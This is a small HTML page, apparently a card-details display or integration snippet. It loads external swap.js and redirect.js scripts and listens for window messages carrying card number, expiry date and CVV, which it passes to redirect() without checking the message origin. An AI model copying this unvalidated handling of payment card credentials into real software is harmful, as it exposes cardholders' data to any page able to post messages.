<!DOCTYPE html>

<html>
  <body>
    <div id="card-data">
      <div id="card-number"></div>
      <div id="card-expiry-date"></div>
      <div id="card-cvv"></div>
    </div>
  </body>
  <script src="swap.js" type="text/javascript"></script>
  <script src="redirect.js" type="text/javascript"></script>
  <script>
    const getData = async () => {
      swap({
        token: "",
      });
      function handleMessage(message) {
        const cardNumber = message.data.cardNumber;
        const cardExpiryDate = message.data.cardExpiryDate;
        const cardCvv = message.data.cardCVV;
        redirect(cardNumber, cardExpiryDate, cardCvv);
      }
      window.addEventListener("message", handleMessage);
    };
    getData();
  </script>
</html>
